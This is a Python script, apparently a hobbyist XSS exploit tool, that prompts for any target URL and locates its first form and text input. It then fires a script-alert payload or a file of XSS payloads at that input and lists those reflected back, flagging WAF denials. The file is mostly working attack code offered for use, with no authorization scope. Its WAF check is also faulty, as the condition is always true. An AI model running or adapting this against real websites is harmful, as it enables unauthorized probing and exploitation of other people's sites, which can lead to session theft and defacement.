import requests,os
from colorama import Fore, init
from bs4 import BeautifulSoup
init()
lc = Fore.LIGHTCYAN_EX
dc = Fore.CYAN
lr = Fore.LIGHTRED_EX
ly = Fore.LIGHTYELLOW_EX

def testXss(form_action, input_name, payload):
    global xss_detected_count
    global payload_urls
    global OnePayload

    try:
        payload_url = form_action + '?' + input_name + '=' + payload
        if OnePayload == True:
            print('\n[+] Sending Payload >', payload_url)
        # Send a POST request with the payload
        response = session.post(payload_url)
    except Exception as e:
        print(lr + '\n[x]', e)
    else:
        # Check if the payload is reflected in the response
        if payload in response.text:
            xss_detected_count += 1
            payload_urls.append(payload_url)
            
            if OnePayload == True:
                print(lc+"\n[+] XSS vulnerability detected!")
            else:
                if os.name == 'posix':
                    os.system('clear')
                elif os.name == 'nt':
                    os.system('cls')
                print(banner)
                print(tagline)
                print('\n[+] Sending Payload >', payload_url)
                print('\n[+] Successful Payload Count',xss_detected_count)


        elif 'A potentially unsafe operation has been detected' or response.status_code == 403:
            if OnePayload == True:
                print(ly + '\n[!] Website Security (WAF) Denied Access!')
            else:
                pass

        elif response.status_code != 200:
            if OnePayload == True:
                print(lr + "\n[x] Testing XSS Failed, Error code:", response.status_code)
            else:
                pass

        else:
            if OnePayload == True:
                print(ly + "\n[!] No XSS vulnerability detected.")
            else:
                pass




banner = """oooooo  ooooo   .oooooo..o   .oooooo..o              oooo               o8o      .    
 `8888    d8'   d8P'    `Y8  d8P'    `Y8              `888               `"    .o8    
   Y888..8P     Y88bo.       Y88bo.       oo.ooooo.    888    .ooooo.   oooo  .o888oo  
    `8888'       `"Y8888o.    `"Y8888o.    888' `88b   888   d88' `88b  `888    888    
   .8PY888.          `"Y88b       `"Y88b   888   888   888   888   888   888    888    
  d8'  `888b    oo     .d8P  oo     .d8P   888   888   888   888   888   888    888 .  
o888o  o88888o  8""88888P'   8""88888P'    888bod8P'  o888o  `Y8bod8P'  o888o   "888"  
                                           888                                         
                                           888                                        
"""

tagline = """"----------------------------------------------------------------------------------------
              [+] Coded by GH0STH4CKER           [+] Version 1.0.0
----------------------------------------------------------------------------------------"""
print(dc + banner)
print(tagline)

# Defining formaction url and input name as None 
form_action = input_name = None
xss_detected_count = 0
payload_urls = []

# Replace with the target URL
print(lc + '')
target_url = input('Target URL: ')

print('')
xss_amnt = input('Payloads [one/all]: ')
if xss_amnt.lower() == 'all' :
    OnePayload = False
elif xss_amnt.lower() == 'one':
    OnePayload = True
else:
    exit()

# Payload file
single_payload = "<script>alert('xss');</script>"
payload_file = "xsspayloads.txt"

# Read payloads from the file
with open(payload_file, "r", encoding="utf-8-sig") as file:
    payloads = [line.strip() for line in file.readlines()]

# Send an HTTP GET request to the webpage to find searchbox
response = requests.get(target_url)
html_content = response.text

# Parse the HTML content using BeautifulSoup
soup = BeautifulSoup(html_content, "html.parser")

print('\n[+] Finding Input Fields')

# Find the first <form> tag
form_tag = soup.find("form")
if form_tag:
    form_action = form_tag.get("action")
    if 'http' not in form_action:
        form_action = target_url + '/' + form_action

# Find the first <input> tag with type attribute "text"
input_tag = soup.find("input", {"type": "text"})
input_tag2 = soup.find("input", {"type": "search"})
if input_tag:
    input_name = input_tag.get("name")
elif input_tag2:
    input_name = input_tag2.get("name")

# Create a session
session = requests.Session()

if form_action and input_name:
    if OnePayload:
        testXss(form_action, input_name, single_payload)
    else:
        for payload in payloads:
            testXss(form_action, input_name, payload)


        print(lc+'\n[+] Successful XSS Payload count : ',xss_detected_count,) 
        if xss_detected_count > 0:
            print('\n[+] All successful Payloads :')
            for p in payload_urls :
                print(p)

elif input_name:
    if OnePayload:
        testXss(form_action, input_name, single_payload)
    else:
        for payload in payloads:
            testXss(target_url, input_name, payload)

        print(lc+'\n[+] Successful XSS Payload count : ',xss_detected_count,) 
        if xss_detected_count > 0:
            print('\n[+] All successful Payloads :')
            for p in payload_urls :
                print(p)

else:
    print(ly + 'Input Fields Not Found !')
